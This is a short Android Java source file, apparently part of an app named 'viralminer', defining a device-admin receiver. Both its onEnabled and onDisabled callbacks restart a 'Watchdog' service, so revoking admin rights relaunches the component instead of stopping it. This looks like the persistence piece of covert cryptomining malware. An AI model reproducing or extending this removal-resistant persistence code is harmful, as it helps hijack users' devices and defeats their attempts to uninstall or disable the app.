package com.viralminer;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override public void onEnabled(Context c, Intent i)  { Watchdog.ensureRunning(c); }
    @Override public void onDisabled(Context c, Intent i) { Watchdog.ensureRunning(c); }
}
